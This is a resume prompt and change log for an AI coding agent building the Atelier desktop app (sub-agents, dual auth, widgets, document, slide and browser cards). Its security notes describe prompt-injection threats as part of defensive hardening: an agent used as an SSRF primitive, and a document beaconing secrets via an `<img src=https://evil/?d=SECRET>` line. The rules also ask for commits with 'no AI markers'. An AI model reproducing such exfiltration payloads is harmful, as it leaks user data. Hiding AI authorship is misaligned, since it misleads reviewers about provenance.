# Atelier — resume prompt

## THE GOAL (paste this after a context clear)

**Make Atelier a strict superset of OpenSwarm, then make every subsystem a living widget.** Work at ~/Desktop/openswarm (branch swarm-extensions), app = /Applications/Atelier.app. DUAL AUTH: the agent backend must run on EITHER the Claude Max subscription (default today; CLI OAuth via the isolation env) OR a raw ANTHROPIC_API_KEY — a provider setting in /config + the Settings view (key stored in ~/.atelier/settings.json, rendered redacted, passed into the SDK env instead of being stripped when api mode is selected). Never limit features to one auth mode. Read first: this file, docs/UI-BACKLOG.md, wiki Projects/OpenSwarm.md + Analysis/Atelier + Dashboard Merge Plan.md in the vault ~/Desktop/AI Brain.

**Phase A — total parity.** Drive docs/UI-BACKLOG.md (all 54 features) to DONE in Atelier's idiom (vanilla JS modules on window.Atelier, warm-cream/terracotta, views + cards + widgets, dual-auth per above). Add a Status column to UI-BACKLOG.md and keep it current. Previously deferred/rejected items get REWORKED into Atelier-native equivalents, not skipped:
- Agent orchestration: Agent cards spawn SUB-AGENTS as real child sessions (a SpawnAgent/CheckAgent MCP tool pair on lite_server, sessions gain parent_id, depth cap 1, child cap ~4) that AUTO-REVEAL as cards beside the parent with live SVG ARROWS (world-coord connector layer that follows drags) — this was in flight, build it first.
- In-place board switch (drop location.reload); output version history (port cc-dashboard/OpenSwarm versions.py idiom); marquee-link (drag a box around a browser card to link it to an agent session); onboarding tour; App Builder → "mini-app card" (agent scaffolds a small self-contained HTML view-card, no runtime); 9Router/multi-provider → a model + provider picker (sonnet/opus/haiku AND subscription-vs-API auth via /config + CLAUDE_CLI_MODEL; settings/credentials panel becomes full parity: API key entry, redacted display, live validation); terminal → read-only run-log card streaming ~/.atelier/logs/backend.log; MCP registry → tool-inspector card over the atelier MCP tools.

**Phase B — living widgets.** Every subsystem gets a glanceable, animated, warm-cream canvas widget (registerWidget-based, configurable, persisted, mount/cleanup discipline):
- Scheduler = the flagship: a circular TIMER widget per job — an SVG ring that fills (stroke-dashoffset synced to the real next-fire time from /jobs cron parsing), pulses when the job fires (new /runs ledger line), then resets and fills again — the visible "light completing the circuit then re-arming the loop".
- Runs = ticker widget (last N ledger lines, green/red pulse on arrival); Campaign = gate-pipeline widget (brief → produce → critic → publish nodes lighting up from campaign state); Agent sessions = status-orb widgets (breathing idle/running/error light, click opens the card); Claude Code spend = burn gauge (today vs 7-day average from /cc/aggregate); backend + scheduler health = heartbeat dots.

**Execution mandate: this is ONE goal, not a menu.** Work through Phase A and Phase B continuously to completion — round after round (research → parallel Workflow build → adversarial review → fix → Electron screenshot-verify → rebuild the .app → commit → docs), picking the next undone item yourself each time, until BOTH phases are done. Done means: every UI-BACKLOG.md row shows DONE (or an explicit Atelier-native equivalent shipped), dual auth works end to end, and every Phase B widget is live on the canvas. Only stop for a hard blocker needing Jason's decision (say so explicitly) or when everything is verified done.

**Rules** (proven over 12 rounds): research-first, then Workflow builds — parallel disjoint-file agents against a FROZEN contract → 2 adversarial reviewers → fixer; keep the pytest suite green (301 baseline) and node --check everything; screenshot-verify in real Electron (playwright-core _electron harness in desktop/) BEFORE electron-builder; rebuild + reinstall /Applications/Atelier.app each round; commit per round (no AI markers); update vault wiki page + index/log + this RESUME + auto-memory each round.

---

## Prior resume context (rounds 1-12)

Resume the **Atelier** project. Atelier is my fork of VRSEN/OpenSwarm at `~/Desktop/openswarm` (branch `swarm-extensions`), extended into a deliverable workforce **and a desktop app**, all running on my **Claude Max subscription** (zero API keys).

**Read these first for full state** (do not rebuild from scratch): the wiki page `Projects/OpenSwarm.md` in the Obsidian vault `~/Desktop/AI Brain`; and in the fork: `docs/EXTENSIONS.md`, `docs/UI-BACKLOG.md` (54 ranked OpenSwarm features), `BACKLOG.md`.

**Current state (through commit `1651ad6`)**
- **Agency** (Python, Agency Swarm): backlog #1–#12 + the Claude-subscription model backend (`claude_subscription_model.py`, `DEFAULT_MODEL=claude-cli`) + Campaign meta-agent. 241 tests.
- **Isolation is DONE and on by default in the app**: with `CLAUDE_ISOLATED=1`, `run_cli` adds `--safe-mode` + a fresh `CLAUDE_CONFIG_DIR` (`~/.atelier/claude-home`) + `CLAUDE_SECURESTORAGE_CONFIG_DIR=''` (empty string — undocumented; keeps Max OAuth on the default macOS Keychain item, so token refresh stays unified) + explicit `--model` (env `CLAUDE_CLI_MODEL`, default sonnet) + one no-login fallback retry. The app agent is pure Atelier — no global CLAUDE.md/hooks/superpowers/OMC bleed. Live-verified.
- **Desktop app** (`~/Desktop/openswarm/desktop/`, modular vanilla JS on `window.Atelier`): everything from before PLUS
  - **Multiple dashboards** (`app/boards.js`): named boards, create/rename/duplicate/delete/switch, sidebar list + all-boards panel with search, real thumbnails via a `capturePage` IPC (DIP-converted, 480w JPEG in localStorage). Per-board state = localStorage snapshot swap + `location.reload()` (in-place switch is the named upgrade path).
  - **Live data**: `lite_server.py` endpoints `/metrics` `/runs` `/jobs` `/notifications` (read-only, empty-shape on missing files, origin-gated CORS + 403 middleware; shared-secret header is the named upgrade). Widgets (metric/status/chart/list) have `source` + `field` config and poll every 15s; workflow/calendar/history app cards show real scheduler jobs + run ledger + notifications.
  - **Embedded browser cards**: real `<webview>` (partition `persist:atelier-browser`, preload stripped + nodeIntegration pinned off in `will-attach-webview`, popups denied, `window.open` → OS browser), URL normalize, back/forward/title/nav events, iframe fallback outside Electron. No tabs yet; OAuth popups not routed (denied) — both are named ceilings.
  - **Fit-to-view** (zoombar ⤢ + `Atelier.canvas.fitToView`), **⌘M** add-app, **Escape** close, ⌘K palette now spawns fully mounted+persisted widgets (core `spawnWidget` delegates to the widgets module).
- **Packaging is DONE — Atelier.app is portable** (506M, installed at `/Applications`): `desktop/scripts/build-python-env.sh` builds a python-build-standalone 3.13 env (271M, ad-hoc signed) into `desktop/build-staging/`; electron-builder `extraResources` ship it at `Resources/python-env` plus the backend source set at `Resources/backend`; `main.js` resolves both via `app.isPackaged`. Verified: backend spawns from inside the .app (health ~6s), live `/chat` on the subscription with the isolated config. External deps that stay on the machine: the `claude` CLI (logged into Max) and network.
- **To rebuild the .app**: `desktop/scripts/build-python-env.sh` (once, or after backend dep changes) → `cd desktop && CSC_IDENTITY_AUTO_DISCOVERY=false npx electron-builder --mac dir` → `rm -rf /Applications/Atelier.app && cp -R dist/mac-arm64/Atelier.app /Applications/`. Dev iteration: edit files, `npm start` (uses the repo + `.venv-ext` directly).
- **Verification harness**: `playwright-core` is a desktop devDependency; `_electron.launch({args:['main.js'], executablePath: require('electron')})` drives the real app (webview, thumbnails). Browser-phase testing: serve `desktop/` statically + run `lite_server.py` on 8765.

**Round 9 done (2026-07-01, commits `b46fac9`, `117c37b`)**: packaging hardening (single-instance lock + stale-8765 kill + `~/.atelier/logs/backend.log` + auto-respawn — fixed a live "backend could not start"); roadmap research at vault `Analysis/Atelier Roadmap Research.md`; and the **scheduler daemon is wired** — the app spawns `scheduler/scheduler.py` firing 3 vault jobs (morning-brief/project-rollup/overnight-digest) at a new isolated `POST /open-swarm/get_response` compat route on lite_server, with `catch_up` + `builtin:digest` + lenient loading. `~/.atelier/jobs.yaml` is the user-editable jobs file. 261 tests; verified live (daemon spawns, catch-up fires, runs.jsonl populates, /metrics + History show real data).

**Round 10 done (commits `cae6017`, `dee950a`) — SDK migration SHIPPED.** lite_server's agent now runs on the official `claude-agent-sdk` (native tool_use; `shared_tools/sdk_tools.py` auto-wraps the 10 BaseTools as in-process MCP @tools; /chat = long-lived client, /open-swarm = fresh client per request; isolation unconditional via `setting_sources=[]`). Reliability probe 6/6 (was ~60% on the old fenced-JSON bridge, which stays only for the heavy swarm). The installed Atelier.app carries it (app 692M — the SDK vendors its CLI runtime, diet target). Live E2E verified: all 3 scheduled jobs produced real vault deliverables (Morning Brief, Project Rollup, digest); `max_turns` now 40 (`ATELIER_MAX_TURNS`) after the rollup blew 12 live. 269 tests.

**Round 11 done (commits `6921cc4`→`22b264b`)**: chat token STREAMING (/chat/stream SSE + live-append card), app diet (604M), and deferred round 1 — marquee multi-select / tidy / live minimap, browser card TABS + OAuth popup routing, safe markdown notes, board export/import + inline rename, multi-card AGENT SESSIONS (✳ dock → per-session SDK-client chat cards, /sessions API), and a per-launch ATELIER_TOKEN shared secret on all mutating routes. 284 tests; Agent card round-trip verified live in Electron.

**Round 12 done (commit `731bffc`) — AIEOS ANALYTICS MERGED.** New `desktop/app/views.js` sidebar-view system (`window.Atelier.views`: full-area overlay inside #canvas, "Analytics" sidebar section + footer Settings row, Escape/×/Dashboards-click/board-switch return paths, view persistence) + a Settings view (GET /config: model/max-turns/scheduler/jobs/auth; theme; live status; token presence). `cc_usage.py` = stdlib port of cc-dashboard-app's aimd/cc readers → read-only `/cc/{status,usage,usage/{id},aggregate,heatmap}`. `desktop/app/analytics.js` + vendored Chart.js 4.4.0 = the "Claude Code" tab in warm-cream (stat tiles, per-day area lines, cache donut, by-model bars, peak hours, calendar heatmap on the --viz-* palette, sessions leaderboard). Plan + drop rationale: vault "Analysis/Atelier + Dashboard Merge Plan.md". 301 tests; verified live against real ~/.claude/projects. cc-dashboard-app remains standalone/untouched.

**Round 13 done (2026-07-02, commit `e436111`) — DUAL AUTH + SUB-AGENT ORCHESTRATION.** 5-builder/2-reviewer/1-fixer Workflow; 350 tests (was 301).
- **Dual auth shipped**: `~/.atelier/settings.json` (`{provider, anthropic_api_key}`, 0600, atomic; `ATELIER_SETTINGS_PATH` for tests) read at `build_options()` call time — api mode injects `ANTHROPIC_API_KEY` into the SDK env, subscription mode strips it. Routes: `GET /config` gains `provider/api_key_present/api_key_hint` (last-4 only, never the key); token-gated `POST /config/provider` (400 when api with no key), `POST /config/api-key` (shape-gated `sk-ant-…`), `DELETE /config/api-key` (flips api→subscription), `POST /config/api-key/validate` (LIVE check against api.anthropic.com `/v1/models`, never 500, never echoes). Settings view gained the "Model provider" card (segmented control, password input, Save/Validate/Remove, redacted hint). **Review's MAJOR catch: `env.pop` does NOT survive the SDK transport's `{**os.environ, **options.env}` merge — an inherited `ANTHROPIC_API_KEY` would silently bill the API while the UI said subscription. Strip is now empty-string overrides (verified live: CLI treats `""` as unset → OAuth).**
- **Sub-agents shipped**: `_AgentSession` gains `parent_id/depth`; depth-0 session clients get a per-client in-process `orchestra` MCP server (`SpawnAgent`/`CheckAgent`); depth cap structural (depth-1 gets no orchestra), child cap 4, CheckAgent containment (parents can only read their own children), session cap default now 12 with `_make_room()` LRU eviction; SpawnAgent re-checks the parent after `_make_room`'s await (TOCTOU). `app/arrows.js` = world-coord SVG connector layer inside `#content` (pan/zoom free; MutationObserver follows drags; rAF loop follows tidy; dash-flow animation; `Atelier.arrows.link/refresh/count`). `sessions.js`: `createAgentCard(pos, attach)` attaches to existing sessions; module-level 2.5s discovery sweep auto-reveals children beside the parent + links arrows; dismissed-ids set prevents ghost resurrection. **Live-verified in real Electron: one prompt → SpawnAgent ran on the subscription, "Scout" card auto-revealed beside the parent with a live arrow in ~6s; `/sessions` showed parent_id/depth.**
- `docs/UI-BACKLOG.md` now has a **Status column** (25 DONE / 5 PARTIAL / 17 REWORKED / 7 PLANNED) + legend — keep it current every round.

**Round 14 done (2026-07-02, commit `1a233cb`) — IN-PLACE BOARD SWITCH + RUN-LOG CARD.** 7-builder/2-reviewer/1-fixer Workflow; 360 tests (was 350).
- **In-place switch**: `location.reload()` is gone from boards.js. One shared `mountBoard(id)`: will-switch flush → thumb + snapshot (quota-abort intact, board unchanged on failure) → `A.canvas.removeAllCards()` (new core API; built-ins stamped `data-atl-builtin` and skipped — and now PERMANENT: their × is disabled since nothing can recreate them without a reload) → snapshot swap → `boards:switched` → each module re-mounts (widgets/apps `restoreFromStore()` idempotent; customization re-applies theme/layout/viewport; sidebar re-renders). Review catches: the quota-abort path would have destroyed agent conversations (sessions' will-switch bulk-close fired DELETEs pre-gate — moved to post-gate removeAllCards); a board deleted during `await captureThumb()` could mount a ghost (mountBoard revalidates + falls back like boot); open widget config panels leaked pollers across switches (closed on real will-switch). Chat transcript now persists across switches (matches the one long-lived backend conversation).
- **Run-log card** (terminal rework): `GET /logs/backend?tail=N` (1..1000, seek-from-end, 1MB cap, `ATELIER_BACKEND_LOG` override, never-500) + `app/runlog.js` — dark warm terminal card (#2b2320, cream mono), 2s chained poll, bottom-anchored autoscroll, Pause/Resume, path header; reachable via ⌘K palette. Live-verified: A→B→A switch with zero reloads and exact card restore; run-log streams the real backend log in the installed app.

**Round 15 done (2026-07-02, commit `924aa78`) — VERSION HISTORY + MARQUEE-LINK + MODEL PICKER.** 7-builder/2-reviewer/1-fixer Workflow; 420 tests (was 360).
- **Output version history**: `shared_tools/versions_store.py` — content-addressed store at `~/.atelier/versions` (zlib blobs + manifests, digest dedupe, prune 50, atomic; `ATELIER_VERSIONS_DIR` override); `vault_core.write_note` captures the superseded content on every overwrite (lazy import, capture failure never blocks a write); `/versions` + `/versions/list` + `/versions/content` + token-gated `/versions/restore` (vault containment, Sources/ refusal case-folded, pre_restore capture first); `app/versions.js` card (notes → versions → preview → restore). Review fixed: the pytest suite was writing real captures into `~/.atelier/versions` (new `tests/conftest.py` env isolation + store sweep).
- **Marquee-link**: shift-drag a box around exactly one browser card + one agent card toggles a browser→agent link (`app/link.js`, arrow + toast, `Atelier.links`); `apps.js` exposes `AtelierApps.browserInfo(cardEl)`; sessions.js prefixes each POSTed message with the linked page's title+url as a framed transport-level context line (optimistic bubble stays clean). **Review hardening: hostile page titles are neutralized (CR/LF/']' stripped, length-capped) so they cannot break out of the context frame — the surface stays user-initiated and visibly framed.** Known contract edge (documented in link.js): closing a third selected card that leaves exactly the pair selected toggles the link; fixing needs a source tag on core's `selection:changed`.
- **Model picker** (completes 9Router rework): settings `model` (settings > `CLAUDE_CLI_MODEL` > sonnet), token-gated `POST /config/model` (sonnet/opus/haiku), Settings segmented picker beside the r13 provider control. Live-verified in Electron: real shift-drag → 1 link + 1 arrow; Versions card lists a real capture; installed app serves `/versions` live.

**Round 16 done (2026-07-02, commit `0528482`) — TOUR + MINI-APP + TOOL INSPECTOR + AGENT-DRIVEN BROWSER.** 7-builder/2-reviewer/1-fixer Workflow (fixer crashed mid-run on an API error; resumed from cache, remaining fixes verified/applied); 440 tests (was 420).
- **Mini-app card** (App Builder rework): `POST /miniapp` — fresh toolless SDK client, dedicated scaffold prompt, extracts one self-contained HTML doc (300k cap); `app/miniapp.js` renders it in a `sandbox="allow-scripts"` iframe (NEVER allow-same-origin), board-persisted (200k cap, honest oversize path), Rebuild/Source. Live-proven: a real tip calculator generated on the subscription in ~28s.
- **Tool-inspector card** (MCP registry rework): `GET /tools` introspects the 10 atelier tools + 3 orchestra tools; `app/toolinspector.js` lists + expands schemas.
- **NavigateBrowser** (browser-agent rework): third orchestra tool — the agent opens http(s) URLs in the USER-linked browser card (session `browser_nav` seq-gated via polling; scheme-gated both sides; `AtelierApps.browserNavigate` rides the URL bar's own path).
- **Onboarding tour**: `app/tour.js` spotlight overlay (10 steps, look-only, cutout + popover, auto-start once via RAW localStorage `atelier-tour-done`, Settings "Restart tour" row).
- Review fixes: lastNavSeq reset with session recreation, miniapp identity-guard + oversize carry, tour keyboard passthrough tightened.

**Round 17 done (2026-07-02, commit `e7392ee`) — PHASE B LIVING WIDGETS + WORKFLOW EDITOR.** 11-builder/2-reviewer/1-fixer Workflow; 489 tests (was 440). **Every UI-BACKLOG row is now DONE or REWORKED (54/54).**
- **Six living widgets** (registerWidget types, real data, mount/cleanup): `schedring` flagship (SVG ring fills toward the REAL next fire — `/jobs` now serves `next_fire`/`fire_after` built with the daemon's own triggers, interval jobs anchored to the last ledger fire; 1s countdown; green/red pulse on a new `/runs` line then re-arm), `runsticker` (flash-pulse ledger lines), `campaignflow` (brief→produce→critic→publish gates from `/campaigns`), `agentorbs` (breathing session orbs; click reveals/re-attaches the card via `AtelierSessions.reveal`), `ccburn` (semicircle today-vs-7-day-avg gauge from `/cc/aggregate`), `heartbeat` (backend dot off the health bus + scheduler dot over a new `atelier:scheduler-status` IPC).
- **Workflow editor card** (`app/jobsedit.js`, last Phase A row): list/add/edit/delete jobs over token-gated `POST /jobs` + `DELETE /jobs/{name}` (atomic yaml upsert preserving unknown keys, daemon-identical validation, 409 without a user jobs file); the daemon **hot-reloads** the jobs file (30s mtime watch, lenient rediff, bad file keeps old jobs, catch-up one-shots reconciled).
- Review majors: unreadable jobs file can no longer be wiped by POST; interval `next_fire` no longer re-anchors per request (the ring was frozen for interval jobs). Late-registering widget types self-heal persisted instances via `widget:registered`. Accepted follow-up: yaml comments are lost on a successful jobs write (ruamel round-trip is the upgrade). Live-verified: all six widgets on canvas with real data; jobs editor over the real jobs file; installed app healthy.

## Round 18 — sub-agent debugging fixes (2026-07-02, commit `2c52653`)

User report: "the routing for subagents is messy, we cannot see the orchestrator message to the subagent, and you cannot move the subagent panel around once connected, also connection is not good." All three fixed and live-verified with a real spawn.

- **Delegation visibility.** The delegation was a tool call the transcript never showed. `lite_server.py` now records a display-only `note`-role event on BOTH sides: on the orchestrator's session (`→ Delegated to sub-agent "X": task` and `← "X" replied: …`, via `_note_parent`) and on the sub-agent's session (`Task from orchestrator "Y"`, a leading note before the delegated task). Notes live only in the render-only `_sessions[*].messages` ledger — **never** replayed to the model (verified end-to-end: `_run_session_turn` sends only the current `query(message)`, `_collect_response` reads the client, no history/resume path), so they surface routing without touching model context. `sessions.js` renders `note` as a centered `.atl-agent-eventline`; the fragile first-message frontend labeling was removed.
- **Drag once connected.** Govern mode's capture-phase mousedown used to `preventDefault`, which also killed core's `.card-bar` drag — so a connected/candidate card could not be moved while any chat stayed armed (and govern is sticky). Rewritten as click-vs-drag: `onArmDown` records the press without swallowing it (core's bubble-phase drag still runs), `onArmUp` toggles governance only on a near-still (<5px) release over the same card. Govern now **auto-exits after a successful connect** so a later plain click can't silently ungovern. Ignores synthetic events (`isTrusted`) and resize-handle grabs.
- **Connection clarity.** `arrows.js` reads as a solid link (stroke 2→2.5, opacity .55→.82, rounded caps, soft drop-shadow halo, faster flow).
- Two adversarial reviewers (correctness + govern event-flow) cleared it; their findings (illegible caption, govern→delegate child unlabeled, sticky-mode re-trap, resize-toggle edge) were all folded in before commit.
- Gates: **583 backend tests** (+5 new delegation-note tests), `node --check` clean. Live Electron verify: real spawn showed both event lines + arrow; armed-drag moved a card 412px without connecting; click connected and auto-exited. Rebuilt + reinstalled (605M) — edits confirmed in the bundled backend + asar.

## OpenSwarm→Atelier feature parity — multi-round program (started 2026-07-02)

**Comparison result:** Atelier's HEAD is a strict **descendant** of `upstream/main` (VRSEN/OpenSwarm), 87 commits ahead, deleted **0** files. The only gap is runtime: the app runs `lite_server.py`, which skips OpenSwarm's **8 specialist deliverable agents** (the heavy swarm lives in `server.py`/`swarm.py`). A full per-agent port spec exists (feasibility + deps + the Atelier integration pattern). **The Atelier-native pattern:** add a keyless `agency_swarm` `BaseTool` to `LIGHT_TOOLS` (auto-wrapped/allowed/inspected — lazy-import heavy deps inside `run()`), and/or a deliverable app card + a `/xxx` route mirroring `/miniapp`. Bundle heavy binaries in the app's python-env; key-gate paid tools with the Notion served-but-conditionally-allowed pattern.

**User-confirmed roadmap (2026-07-02), keyless first, then key-gated:**
1. **Documents (PDF/Word/MD)** — **DONE, round 19** (commit `baac3db`). See below.
2. **Slide decks (.pptx)** — **DONE, round 21** (commit `a362362`). See below. Did NOT need OpenSwarm's heavy toolchain — used python-pptx (pure Python) directly from a structured deck.
3. **Deep research reports** — **DONE, round 20** (commit `c41e84b`). See below.
4. **Narrated short videos** — reuse Jason's owned reddit-shorts pipeline (edge-tts + local whisper + ffmpeg); keyless captioned vertical video. Needs `REDDIT_SHORTS_PATH` + ffmpeg bundled.
5. **Key-gated add-ons** (user chose "add them, gated behind a key"): image generation (GOOGLE/FAL keys), generative video (OPENAI/GOOGLE/FAL), Composio virtual assistant (email/calendar/Slack; COMPOSIO keys) — served-but-gated on a Settings key, zero-key stays default.
6. **Live activity dashboard** (user ask): watch an agent drive the linked browser in realtime + see what it's doing; see orchestrator↔subagent messages live — "a feature with everything," surfaced via widgets.
7. **Enhanced schedule widget** (user ask): a loop with flowing arrows and a thick arc that highlights in color toward completion and shows when the task repeats next — evolve the flagship `schedring` widget.

### Round 19 — Documents deliverable (2026-07-02, commit `baac3db`)
Zero new Python deps. `POST /document` mirrors `/miniapp` (a DOCUMENT system prompt, no tools, tight turn cap) → `{"html","title"}`, one print-ready self-contained HTML document (docs_agent's HTML-as-source model). `app/document.js` = a Document card: prompt + optional title → preview in a fully-sandboxed `sandbox=""` iframe (static doc, no scripts) → export **PDF via Electron's bundled `printToPDF`** (main.js `atelier:save-pdf`, offscreen node-less js-disabled window — no weasyprint/Chromium to bundle) and **HTML** (`atelier:save-text`); both on the preload bridge, buttons render only under Electron. Board-scoped persistence mirrors miniapp. **595 tests (+12); live-verified**: real "Internal Memorandum" rendered in-card, PDF export wrote a valid 13.8 KB %PDF. Fast-follow (deferred): DOCX/MD export (pure-python `python-docx` + an html→md pass).

### Dock/overlay pin fix (2026-07-02, commit `49ccc57`)
User-reported: the bottom dock (and minimap/zoombar) drifted to mid-canvas. Root cause: `.canvas { overflow: hidden }` still creates a scroll container; `#content` (the panned card layer) overflows it, so `scrollIntoView` (⌘K palette) / input focus scrolled the canvas, dragging the `bottom:*`-anchored overlays up by the scroll offset (bigger pan → bigger drift → mid-screen). Fix: `.canvas { overflow: clip }` — clips identically but is never scrollable (panning is a `#content` transform, nothing depends on canvas scroll). Verified: after forcing `scrollTop=200` + focus + `scrollIntoView`, `scrollTop` stays 0 and the dock sits 22px from the bottom at small and large windows; confirmed visually in the rebuilt app.

### Round 20 — Deep Research deliverable (2026-07-02, commit `c41e84b`)
Keyless, no new deps. `POST /research` keeps the atelier MCP server but allow-lists ONLY `mcp__atelier__WebSearch` + `WebFetch` (a research run reads the web but can't touch campaigns/vault/Notion), `max_turns=30` for the search→read→synthesize loop, a RESEARCH prompt requiring real citations + a Sources section → `{"html","title"}`. `app/research.js` = a Research card reusing document.js's shared card CSS + verified persistence/board-switch; sandboxed preview + PDF/HTML export. **604 tests (+9); live-verified**: a real keyless research turn produced a cited "France Landmark" report (Paris/Eiffel Tower + sources) in the card.

### Round 21 — Slides deliverable (2026-07-02, commit `a362362`)
The slides_agent capability WITHOUT its heavy toolchain (no LibreOffice/Node html2pptx/Poppler/playwright). The model authors a STRUCTURED deck (JSON: title/subtitle + slides of title/bullets/notes); the backend renders a self-contained 16:9 HTML preview and builds a real editable `.pptx` with **python-pptx** (pure Python). `POST /deck` → `{"deck","html","title"}`; `POST /deck/pptx` → `{"pptx_b64"}` (title slide + Title-and-Content slides + notes). `app/deck.js` = a Slides card reusing document.js's CSS; previews in a sandboxed iframe, exports `.pptx` (new `atelier:save-binary` IPC + `saveBinary` bridge) + HTML. **615 tests (+11)** incl. decoding the pptx and asserting a valid OOXML zip; **live-verified**: a real 4-slide "Morning Walks" deck rendered and exported a valid 40 KB `.pptx`.

**python-pptx bundling note:** it is declared in `requirements.txt` but the bundled `desktop/build-staging/python-env` (pip-less python-build-standalone, gitignored) lacked it, so it was **copied from `.venv-ext/lib/python3.13/site-packages`** (pptx + lxml + PIL + xlsxwriter + dist-info; both envs are py3.13 arm64). The packaged .app interpreter imports it (11 layouts). A clean env rebuild that installs from `requirements.txt` would include it automatically; if the env is ever rebuilt without pip, re-copy those four package trees. App is now 640M (was 605M).

### Round 22 — Agent-driven browser (OpenBrowser) (2026-07-02, commit `3b3621f`)
User priority #1 of 3 new asks (agent<->card canvas connections). The shared mechanism: an agent SPAWNS a card on the canvas, arrow-links to it, and DRIVES it — no manual user gesture. Shipped for the browser case; #2 (agents connect to any dashboard card) and #3 (workflows surface as chat cards) reuse this same spawn+link+drive path next.
- **Backend**: new `OpenBrowser(url)` orchestra tool (the 5th orchestra tool; `_orchestra_tools` returns it at index [4], `_delegate_agent` stays [3] so index-based test unpacking is intact). Depth-0 only, allow-listed alongside NavigateBrowser. Sets `session.canvas_op = {kind:"browser", url, seq}` on its own monotonic `_canvas_op_seq`; surfaced on `GET /sessions/{id}` only (never the list). Distinct from `NavigateBrowser`/`browser_nav` (which drives a browser the USER marquee-linked) — OpenBrowser is agent-initiated with no gesture, so it is host-gated to the PUBLIC web via `_agent_open_host_blocked` (loopback / private / link-local / reserved / multicast / `localhost` refused): a prompt-injected agent otherwise had an unrestricted outbound-GET/SSRF primitive reaching the backend on 127.0.0.1:8765, the LAN, and 169.254 metadata. NavigateBrowser keeps full reach (the user deliberately linked that card). ATELIER_INSTRUCTIONS nudge the model to prefer OpenBrowser when opening a page.
- **Frontend**: `link.js` gains a programmatic `A.links.link(agentEl, browserEl)` (the marquee toggle-ON path minus the gesture — draws the browser->agent arrow AND registers the pair in the same Map `browserElFor` reads, so a later NavigateBrowser drives the auto-created browser). `sessions.js` polls `canvas_op` with a per-card `lastCanvasOpSeq` gate (reset with the session in ensureSession; attached/revealed cards baseline the existing browser_nav+canvas_op seqs on their first poll, so revealing a still-live depth-0 session can't replay a stale op into a spurious spawn). `handleCanvasOp` -> `openLinkedBrowser`: reuse an already-linked browser if present, else `A.spawnApp('browser')` positioned BELOW the agent card (clear of the right-side sub-agent child column so it never lands on the k=0 child slot), then `links.link` (arrow + registry) + `AtelierApps.browserNavigate` (queues the load until the webview attaches). spawnApp / Atelier.links / AtelierApps all guarded.
- **Review**: 2 adversarial reviewers (correctness + security). Security MAJOR folded in = the private-host block above. Correctness folded in = browser repositioned below the agent (was overlapping the first sub-agent child), attached-card stale-op replay suppressed, honest "new linked browser card" note only when the link actually registered.
- Gates: **623 backend tests** (+8: OpenBrowser sets/rejects/seq/parent-gone/detail-carries/tools-route/allow-list/independent-counters + the host-block helper), `node --check` clean on link.js + sessions.js. **Live Electron verify** on a FRESH board: one prompt -> the isolated app agent called OpenBrowser -> a browser card auto-spawned below the agent, a terracotta dashed arrow connected them, and it loaded example.com in ~8s (`arrows.count()`=1, `links.count()`=1; screenshot confirms the visible arrow). Rebuilt + reinstalled `/Applications/Atelier.app`.

### Round 23 — Agents connect to dashboard cards generally (CreateCard) (2026-07-02, commit `ea8253f`)
User priority #2 of 3. Generalized r22's spawn+link+drive into a general "an agent spawns a card, arrow-links to it, and fills/operates it" capability, for NOTE and DOCUMENT cards (browser stays r22). Orchestrated with workflows (ultracode): a 5-reader understand Workflow mapped the card injection surfaces, then a 3-lens adversarial review Workflow (10 agents, each finding independently verified) on the diff.
- **Backend**: one generic `CreateCard(kind, title?, content)` orchestra tool (6th tool; `_orchestra_tools` index [5], delegate stays [3], open_browser [4]). Depth-0 only, allow-listed. kind ∈ {note, document}; the agent authors the content INLINE (design A — no nested generation turn). Per-kind caps (`_CREATE_CARD_CAPS`: note 8k, document 300k) enforced before recording. Sets a canvas op {kind, title, content, seq}.
- **canvas_op → canvas_ops QUEUE (review MAJOR fix)**: `_AgentSession.canvas_op` (single slot) became `canvas_ops` (a bounded list, `_push_canvas_op`, cap `_MAX_CANVAS_OPS`=50). r22's single slot was last-writer-wins with only OpenBrowser writing it; r23 adds a second actively-encouraged writer, so two spawn tools in ONE turn (sub-second apart, faster than the 1.5s poll) would silently drop all but the last — a lost deliverable. Now the detail route serves the whole list and the card drains every op past its seq high-water mark, in order, each poll. `GET /sessions/{id}` carries `canvas_ops` (list); the r22 attach-baseline adopts the max existing seq.
- **Frontend**: `sessions.js` `handleCanvasOps` drains the queue → `dispatchCanvasOp` routes by kind; `openLinkedCard(type, op)` spawns the card below the agent (new `belowPos()` cascade shared with the browser path so a burst doesn't stack), fills it (`AtelierApps.spawnNote(text,pos)` — new; `AtelierDocuments.spawn({worldPos,html,title})` — existing), and draws the arrow via `A.arrows.link` DIRECTLY (NOT the browser link registry — a note is not a browser and browserElFor has no type guard; arrows.js auto-unlinks on card:removed). `apps.js` gained `AtelierApps.spawnNote` (threads text through makeApp config — a raw DOM poke wouldn't fire buildNote's input listener or persist).
- **Document CSP (review MAJOR fix)**: `sandbox=""` denies scripts/forms/same-origin but NOT passive subresource loads (`<img>`/`<link>`/font), so a prompt-injected document could beacon context out via `<img src=https://evil/?d=SECRET>`. `document.js` now injects a strict CSP meta (`default-src 'none'; img-src data:; style-src 'unsafe-inline'; font-src data:; base-uri 'none'; form-action 'none'`) at render time (into `<head>`, before any `<img>`) — inline CSS + data: images allowed, all remote fetches blocked. Also fixes the pre-existing /document route (self-contained docs unaffected). Follow-up: research.js/deck.js share the same latent sandbox="" gap (not reachable via CreateCard); PDF/HTML export paths render raw source (user-initiated).
- Board-scoping agent cards DEFERRED to a later round (separate unit: needs backend session survival + attach-restore; the spawned note/document/browser content cards already persist per board).
- Gates: **634 backend tests** (+11: CreateCard set/reject-kind/reject-empty/caps/parent-gone/detail; the canvas_ops queue-not-a-slot + bounded + detail-list tests), `node --check` clean (sessions/apps/document.js). **Live Electron verify** on a fresh board: one prompt → agent called CreateCard(note) → a note card spawned below with "Buy milk and eggs." + arrow; a second prompt → CreateCard(document, "Test Memo") → a document card rendered the agent HTML + a 2nd arrow (screenshots confirm both). Rebuilt + reinstalled `/Applications/Atelier.app`.

### Round 24 — Workflows surface as live chat cards (2026-07-02, commit `8a92388`)
User priority #3 of 3 — the last of the "agent connects to canvas cards" family. A firing scheduled job now becomes a TRACKED session revealed as a live chat card bound to the run, so the user watches the job's conversation (note + prompt + streaming reply, plus sub-agent children + arrows if it delegates), not just a Runs-ticker line. Orchestrated with workflows (ultracode): a 3-reader understand Workflow, then a 3-lens adversarial review Workflow (13 agents, each finding verified) surfaced 6 real of 10 raw, all folded in.
